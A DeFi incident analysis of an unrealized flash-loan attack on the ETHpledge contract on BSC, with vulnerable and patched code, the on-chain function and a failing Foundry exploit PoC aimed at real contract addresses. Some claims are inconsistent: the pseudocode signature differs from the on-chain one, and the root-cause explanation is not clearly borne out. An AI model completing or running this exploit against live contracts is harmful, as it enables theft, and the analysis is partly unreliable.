# Discover/ETHpledge — pledgein Flash Loan Vulnerability Analysis (Unrealized Attack)

| Item | Details |
|------|------|
| **Date** | 2022-06-15 |
| **Protocol** | Discover / ETHpledge |
| **Chain** | BSC (Binance Smart Chain) |
| **Loss** | 0 (attack transaction failed — PoC incomplete) |
| **Attacker** | Attacker address unconfirmed |
| **Attack Tx** | Block 18,446,845 |
| **Vulnerable Contract** | ETHpledge [0xe732a7bD6706CBD6834B300D7c56a8D2096723A7](https://bscscan.com/address/0xe732a7bD6706CBD6834B300D7c56a8D2096723A7) |
| **Root Cause** | `pledgein()` does not restrict the caller to EOA, allowing a contract to execute mass deposit → DISCOVER receipt → BUSD conversion within a single transaction. The PoC failed due to missing repayment logic, but the design vulnerability is real. |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-06/Discover_exp.sol) |

---
## 1. Vulnerability Overview

The `pledgein(address token, uint256 amount)` function of the ETHpledge contract operates by issuing DISCOVER tokens when a user deposits tokens such as BUSD. This function can be called with a large amount of BUSD borrowed via a flash loan, and input validation is insufficient internally.

The attacker attempted to borrow approximately 19.8 billion BUSD via a PancakeSwap flash swap and call `pledgein()`. However, the DeFiHackLabs PoC is incomplete code marked with a "FAIL" comment, and the transaction fails with an `INSUFFICIENT_INPUT_AMOUNT` error due to the absence of flash swap repayment logic. There was no actual loss, but the design vulnerability pattern itself is worth studying.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable ETHpledge pledgein (pseudocode)
contract ETHpledge {
    IERC20 public BUSD;
    IERC20 public DISCOVER;

    // ❌ Can be called with flash loan funds
    // DISCOVER issued proportional to deposit amount → flash loan arbitrage possible
    function pledgein(address token, uint256 amount) external returns (bool) {
        require(token == address(BUSD), "invalid token");
        // ❌ No verification that msg.sender actually holds BUSD long-term
        BUSD.transferFrom(msg.sender, address(this), amount);

        // DISCOVER issued proportional to input amount (excessively favorable ratio)
        uint256 discoverAmount = amount * discoverPerBusd;
        DISCOVER.transfer(msg.sender, discoverAmount);
        return true;
    }
}

// ✅ Correct pattern: flash loan prevention
contract ETHpledgeFixed {
    uint256 private _status; // reentrancy guard

    function pledgein(address token, uint256 amount) external returns (bool) {
        require(_status == 0, "no flash loans");
        _status = 1;

        require(token == address(BUSD), "invalid token");

        // ✅ Blacklist flash loan borrower addresses or verify EOA
        require(msg.sender == tx.origin, "no contracts");

        BUSD.transferFrom(msg.sender, address(this), amount);

        // ✅ Set a cap on the issuance ratio after deposit
        uint256 discoverAmount = _calculateDiscover(amount);
        DISCOVER.transfer(msg.sender, discoverAmount);

        _status = 0;
        return true;
    }
}
```

---
### On-Chain Original Code

Source: Sourcify verified


**ETHpledge.sol** — entry point:
```solidity
// ❌ Root cause: `pledgein()` does not restrict the caller to EOA, allowing a contract to execute mass deposit → DISCOVER receipt → BUSD conversion within a single transaction. PoC failed due to missing repayment logic.
    function  pledgein(address fatheraddr,uint256 amountt)  public  returns (bool) {
        
        bool Limited = receivetime[msg.sender] < block.timestamp;
        require(Limited,"Exchange interval is too short.");

        
        require(usdt.balanceOf(msg.sender)>=amountt,"Bbalance low amount");

        require(amountt>=1*10**18,"pledgein low 1");
        require(fatheraddr!=msg.sender,"The recommended address cannot be your own");

        if (inviter[msg.sender] == address(0)) {
            inviter[msg.sender] = fatheraddr;
            sharenumber[fatheraddr]+=1;
           
        }
        
        //uint day22 =number;
        uint day22 =importSeedFromThird(1);//0xc7c2c8259E43593E2Ae903287087bD9AA2c9AeA0
        uint day2=4;
        income[msg.sender]=_s4;
        if(day22<=4){day2=4;income[msg.sender]=_s4;}
        if(day22==0){day2=10;income[msg.sender]=_s10;}
        if(day22==5){day2=5;income[msg.sender]=_s5;}
        if(day22==6){day2=6;income[msg.sender]=_s6;}
        if(day22==7){day2=7;income[msg.sender]=_s7;}
        if(day22==8){day2=8;income[msg.sender]=_s8;}
        if(day22==9){day2=9;income[msg.sender]=_s9;}
        if(day22==10){day2=10;income[msg.sender]=_s10;}
        uint256 bltt12=_bl1.sub(income[msg.sender]);
        uint256 blt1=amountt.mul(bltt12).div(_baseFee);
        uint256 blt2=amountt.mul(_bl2).div(_baseFee);
        uint256 blt3=amountt.mul(income[msg.sender]).div(_baseFee);
        usdt.transferFrom(msg.sender,address(this), blt1);  // ❌ unauthorized transferFrom
        usdt.transferFrom(msg.sender,_recaddr, blt2);
        usdt.transferFrom(msg.sender,_recaddr2, blt3);

        pledgeamount[msg.sender]=amountt;
        performance[msg.sender]+=amountt;
        fatherperformance[inviter[msg.sender]]+=amountt;
        pledgeday[msg.sender]=day2;
        //receivetime[msg.sender]=block.timestamp+day2*86400;
        if(_test==1){receivetime[msg.sender]=block.timestamp+36;}else{receivetime[msg.sender]=block.timestamp+day2*86400;}
        
        team(amountt);//0x41d0ff4a5Ee609b3B7Dc2B90F154D4eC7cb63659
        return true;
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker (PoC — failed)
    │
    ├─[1] PancakePair2 flash swap
    │       IPancakePair(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d)
    │       .swap(19,800,000,000 BUSD, 0, address(this), "attack")
    │
    ├─[2] [Inside pancakeCall callback]
    │       │
    │       ├─ BUSD.approve(ETHpledge, 19,800,000,000)
    │       │
    │       ├─ ETHpledge.pledgein(BUSD, 19,800,000,000)
    │       │       Mass BUSD deposit → receive DISCOVER issuance (intended)
    │       │
    │       └─ ⚡ No repayment logic → transaction fails
    │               PancakeSwap: "INSUFFICIENT_INPUT_AMOUNT"
    │
    └─[3] Transaction reverted — no actual loss
            PoC comment: "// TODO: FAIL"
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

// ⚠️ This PoC is incomplete and will fail when executed (no repayment logic)

interface IETHpledge {
    // Vulnerable function: callable with flash loan funds
    function pledgein(address token, uint256 amount) external returns (bool);
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract ContractTest is Test {
    IERC20 BUSD     = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 DISCOVER = IERC20(0x5908E4650bA07a9cf9ef9FD55854D4e1b700A267);

    IETHpledge ethpledge = IETHpledge(0xe732a7bD6706CBD6834B300D7c56a8D2096723A7);
    IPancakePair pair1   = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);
    IPancakePair pair2   = IPancakePair(0x92f961B6bb19D35eedc1e174693aAbA85Ad2425d);

    function setUp() public {
        vm.createSelectFork("bsc", 18_446_845);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Before] BUSD", BUSD.balanceOf(address(this)), 18);

        // [Step 1] Flash swap: borrow large amount of BUSD
        // ⚠️ In practice, the swap below fails (cannot repay in callback)
        pair2.swap(19_800_000_000 * 1e18, 0, address(this), "0x01");

        emit log_named_decimal_uint("[After] BUSD", BUSD.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 2] Attempt to call pledgein
        BUSD.approve(address(ethpledge), amount0);
        ethpledge.pledgein(address(BUSD), amount0);

        // ⚠️ No repayment logic → INSUFFICIENT_INPUT_AMOUNT failure
        // In a complete attack, DISCOVER would be sold here to obtain BUSD for repayment
        // BUSD.transfer(address(pair2), amount0 + fee);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing caller restriction on `pledgein()` — allows contract calls without EOA verification, enabling mass deposit → token receipt within a single transaction (unrealized) |
| **CWE** | CWE-20: Improper Input Validation |
| **OWASP DeFi** | Missing contract caller restriction on deposit function |
| **Attack Vector** | Call `pledgein(BUSD, large_amount)` → receive excess DISCOVER → swap for BUSD (single transaction) |
| **Preconditions** | No `msg.sender == tx.origin` or contract call blocking logic in `pledgein()` |
| **Impact** | Unrealized (PoC incomplete). If completed, mass DISCOVER issuance possible |

---
## 6. Remediation Recommendations

1. **Block contract calls**: Add `require(msg.sender == tx.origin, "EOA only")` to prevent contracts from calling `pledgein()` directly.
2. **Restrict same-block deposit/withdrawal**: Apply a cooldown so that DISCOVER receipt or exchange is only possible after at least 1 block has passed since the deposit.
3. **Set issuance limits**: Cap the amount of DISCOVER that can be issued in a single transaction.
4. **TWAP-based exchange rate**: Calculate the issuance ratio using TWAP instead of spot price, which can be manipulated by flash loans.

---
## 7. Lessons Learned

- **Value of an incomplete PoC**: Even if a PoC fails, a design vulnerability may still exist. In this case, an attacker who completes the repayment logic could succeed in an actual attack. The flash loan is merely a funding mechanism; the root vulnerability is the absence of a contract caller restriction in `pledgein()`.
- **Importance of EOA verification**: In deposit functions (deposit, pledgein, etc.), the `msg.sender == tx.origin` check is a basic line of defense against single-transaction composite attacks.
- **BSC small-cap tokens**: In small-scale deposit/reward protocols on BSC, deposit function vulnerabilities lacking contract caller restrictions are repeatedly discovered.
- **Repayment failure ≠ guaranteed safety**: The fact that a flash swap repayment fails does not mean the vulnerability is absent. If the attack design is improved, it can lead to real losses.